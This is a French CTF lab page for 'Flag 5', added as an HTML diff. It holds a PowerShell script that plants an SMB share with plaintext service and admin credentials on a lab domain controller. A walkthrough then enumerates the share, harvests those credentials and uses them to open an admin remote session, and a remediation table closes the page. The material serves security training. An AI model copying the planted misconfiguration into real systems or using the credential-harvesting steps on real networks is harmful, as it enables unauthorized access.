@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 5 — Partage SMB avec fichiers sensibles - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 5 \u2014 Partage SMB avec fichiers sensibles";
+        var mkdocs_page_input_path = "windows/Flag5-SMB-Share.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 5 — Partage SMB avec fichiers sensibles</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="flag-5-partage-smb-avec-fichiers-sensibles">Flag 5 — Partage SMB avec fichiers sensibles</h1>
+<blockquote>
+<p><strong>Technique :</strong> SMB Enumeration + Credential Discovery
+<strong>Machine de déploiement :</strong> DC01
+<strong>Machine d'exploitation :</strong> WS01 ou WS02
+<strong>Compte de départ :</strong> <code>CTF\lowpriv</code> / <code>User@1234</code>
+<strong>Difficulté :</strong> Facile</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="script-flag5-smb-shareps1">Script — Flag5-SMB-Share.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+
+Write-Host &quot;`n[FLAG 5] Partage SMB avec fichiers sensibles&quot; -ForegroundColor Cyan
+
+$sharePath = &quot;C:\Shares\Sensitive&quot;
+New-Item -ItemType Directory -Path $sharePath -Force | Out-Null
+
+# Supprimer le share s'il existe deja
+if (Get-SmbShare -Name &quot;Sensitive&quot; -ErrorAction SilentlyContinue) {
+    Remove-SmbShare -Name &quot;Sensitive&quot; -Force
+    Write-Host &quot;  [~] Ancien share Sensitive supprime&quot; -ForegroundColor Gray
+}
+
+# Creer le share accessible a tous les utilisateurs authentifies
+New-SmbShare -Name &quot;Sensitive&quot; -Path $sharePath | Out-Null
+
+# ACL NTFS : lecture pour utilisateurs authentifies (S-1-5-11)
+# Compatible Windows FR et EN via SID universel
+$aclShare = Get-Acl $sharePath
+$authSID  = New-Object System.Security.Principal.SecurityIdentifier(&quot;S-1-5-11&quot;)
+$ruleAuth = New-Object System.Security.AccessControl.FileSystemAccessRule(
+    $authSID, &quot;ReadAndExecute&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)
+$aclShare.AddAccessRule($ruleAuth)
+Set-Acl -Path $sharePath -AclObject $aclShare
+Write-Host &quot;  [+] Share \\DC01\Sensitive cree (lecture pour utilisateurs authentifies)&quot; -ForegroundColor Green
+
+# flag5.txt
+Set-Content &quot;$sharePath\flag5.txt&quot; -Value &quot;FLAG{smb_sensitive_data_exposed}&quot; -Encoding UTF8
+
+# Script de backup avec credentials en clair
+@&quot;
+# Script de sauvegarde automatique - ne pas supprimer
+# Planifie chaque nuit a 02h00
+net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+robocopy C:\Data Z:\Backup /MIR /LOG:C:\Logs\backup.log
+net use Z: /delete
+&quot;@ | Set-Content &quot;$sharePath\backup.ps1&quot; -Encoding UTF8
+
+# Fichier passwords.txt orientant vers backup.zip
+@&quot;
+# Rotation des mots de passe - CONFIDENTIEL
+# Derniere mise a jour : 2024-01-15
+#
+# Comptes de service :
+#   svc-backup -&gt; voir backup.zip (readme.txt)
+#   svc-web    -&gt; voir backup.zip (readme.txt)
+#
+# Compte admin local WS01/WS02 :
+#   Voir backup.zip -&gt; readme.txt
+&quot;@ | Set-Content &quot;$sharePath\passwords.txt&quot; -Encoding UTF8
+
+# backup.zip contenant les credentials admin-local
+$staging = &quot;C:\Temp\BackupStaging&quot;
+New-Item -ItemType Directory -Path $staging -Force | Out-Null
+@&quot;
+=== Backup de configuration - 2024-01-15 ===
+
+Comptes locaux actifs sur WS01 et WS02 :
+  admin-local : AdminLocal@WS01
+
+Compte de service backup :
+  CTF\svc-backup : Backup@Secure99
+
+Ne pas diffuser.
+&quot;@ | Set-Content &quot;$staging\readme.txt&quot; -Encoding UTF8
+
+Compress-Archive -Path &quot;$staging\*&quot; -DestinationPath &quot;$sharePath\backup.zip&quot; -Force
+Remove-Item $staging -Recurse -Force
+Write-Host &quot;  [+] Fichiers crees : flag5.txt, backup.ps1, passwords.txt, backup.zip&quot; -ForegroundColor Green
+
+# Verifications
+Write-Host &quot;`n  [*] Contenu du share :&quot; -ForegroundColor Yellow
+Get-ChildItem $sharePath | Select-Object Name
+Write-Host &quot;`n  [*] Flag :&quot; -ForegroundColor Yellow
+Get-Content &quot;$sharePath\flag5.txt&quot;
+
+Write-Host &quot;`n[FLAG 5] DONE&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT : DC01 - Flag5 deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="verification-du-deploiement">Vérification du déploiement</h3>
+<blockquote>
+<p>[!warning] Depuis PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell"># Verifier le share
+Get-SmbShare -Name &quot;Sensitive&quot;
+
+# Verifier les fichiers
+Get-ChildItem &quot;C:\Shares\Sensitive&quot;
+# Attendu : flag5.txt, backup.ps1, passwords.txt, backup.zip
+
+# Verifier le flag
+Get-Content &quot;C:\Shares\Sensitive\flag5.txt&quot;
+# Attendu : FLAG{smb_sensitive_data_exposed}
+
+# Verifier le contenu de backup.zip
+Expand-Archive &quot;C:\Shares\Sensitive\backup.zip&quot; -DestinationPath &quot;C:\Temp\test&quot; -Force
+Get-Content &quot;C:\Temp\test\readme.txt&quot;
+Remove-Item &quot;C:\Temp\test&quot; -Recurse -Force
+</code></pre>
+<blockquote>
+<p>[!success] Snapshot DC01
+<strong><code>DC01 — Flag5 déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up">Write-up</h2>
+<h3 id="contexte">Contexte</h3>
+<p>Un partage SMB <code>Sensitive</code> est accessible en lecture à tous les utilisateurs authentifiés du domaine. Il contient plusieurs fichiers dont un script de sauvegarde avec des credentials en clair et une archive de backup contenant un fichier de documentation avec des mots de passe d'administration.</p>
+<hr />
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="etape-1-enumerer-les-shares-disponibles">Étape 1 — Énumérer les shares disponibles</h4>
+<p>Connecté en <code>CTF\lowpriv</code> sur WS01, ouvrir PowerShell :</p>
+<pre><code class="language-powershell"># Lister les shares sur DC01
+net view \\DC01
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Ressources partagées sur \\DC01
+
+Nom du partage  Type  Commentaire
+-----------------------------------------------------------------
+Backups         Disque
+NETLOGON        Disque
+Sensitive       Disque
+SYSVOL          Disque
+</code></pre>
+<p>Le share <code>Sensitive</code> est visible. On y accède :</p>
+<pre><code class="language-powershell">net use S: \\DC01\Sensitive
+dir S:\
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Répertoire : S:\
+
+Mode    Name
+----    ----
+-a----  backup.ps1
+-a----  backup.zip
+-a----  flag5.txt
+-a----  passwords.txt
+</code></pre>
+<hr />
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="etape-2-lire-le-flag-direct">Étape 2 — Lire le flag direct</h4>
+<pre><code class="language-powershell">Get-Content S:\flag5.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{smb_sensitive_data_exposed}
+</code></pre>
+<h4 id="etape-3-aller-plus-loin-lire-backupps1">Étape 3 — Aller plus loin — lire backup.ps1</h4>
+<pre><code class="language-powershell">Get-Content S:\backup.ps1
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code class="language-powershell"># Script de sauvegarde automatique - ne pas supprimer
+# Planifie chaque nuit a 02h00
+net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+robocopy C:\Data Z:\Backup /MIR /LOG:C:\Logs\backup.log
+net use Z: /delete
+</code></pre>
+<p>Les credentials de <code>svc-backup</code> sont exposés : <code>Backup@Secure99</code>.</p>
+<h4 id="etape-4-extraire-larchive-backupzip">Étape 4 — Extraire l'archive backup.zip</h4>
+<pre><code class="language-powershell">Expand-Archive S:\backup.zip -DestinationPath C:\Temp\backup -Force
+Get-Content C:\Temp\backup\readme.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>=== Backup de configuration - 2024-01-15 ===
+
+Comptes locaux actifs sur WS01 et WS02 :
+  admin-local : AdminLocal@WS01
+
+Compte de service backup :
+  CTF\svc-backup : Backup@Secure99
+
+Ne pas diffuser.
+</code></pre>
+<p>On obtient les credentials du compte admin local : <code>admin-local</code> / <code>AdminLocal@WS01</code>.</p>
+<h4 id="etape-5-utiliser-les-credentials-admin-local-sur-ws01">Étape 5 — Utiliser les credentials admin-local sur WS01</h4>
+<pre><code class="language-powershell"># Se connecter en admin local sur WS01
+$cred = New-Object System.Management.Automation.PSCredential(
+    &quot;WS01\admin-local&quot;,
+    (ConvertTo-SecureString &quot;AdminLocal@WS01&quot; -AsPlainText -Force)
+)
+Enter-PSSession -ComputerName WS01 -Credential $cred
+</code></pre>
+<hr />
+<h3 id="recuperation-du-flag">Récupération du flag</h3>
+<pre><code class="language-powershell">Get-Content S:\flag5.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{smb_sensitive_data_exposed}
+</code></pre>
+<hr />
+<h3 id="aller-plus-loin">Aller plus loin</h3>
+<pre><code class="language-powershell"># Utiliser les credentials svc-backup pour acceder au share Backups
+net use B: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
+Get-Content B:\flag3.txt
+
+# Utiliser admin-local pour acceder a WS01 en tant qu'admin
+Enter-PSSession -ComputerName WS01 -Credential (Get-Credential)
+# WS01\admin-local / AdminLocal@WS01
+</code></pre>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Share accessible à tous les utilisateurs authentifiés</td>
+<td>Restreindre l'accès aux seuls comptes qui en ont besoin</td>
+</tr>
+<tr>
+<td>Credentials en clair dans backup.ps1</td>
+<td>Utiliser des secrets managés (LAPS, Azure Key Vault, PSCredential chiffrée)</td>
+</tr>
+<tr>
+<td>Archive de backup avec mots de passe</td>
+<td>Ne jamais stocker de credentials dans des fichiers texte ou archives partagées</td>
+</tr>
+<tr>
+<td>Pas d'audit des accès SMB</td>
+<td>Activer l'audit des accès aux fichiers sur les shares sensibles</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>lowpriv
+  └─→ net view \\DC01 → share Sensitive visible
+        └─→ dir S:\ → flag5.txt, backup.ps1, backup.zip
+              ├─→ flag5.txt → FLAG{smb_sensitive_data_exposed}
+              │
+              ├─→ backup.ps1 → svc-backup / Backup@Secure99
+              │     └─→ net use \\DC01\Backups → flag3.txt
+              │
+              └─→ backup.zip → readme.txt → admin-local / AdminLocal@WS01
+                    └─→ Enter-PSSession WS01 en admin local
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
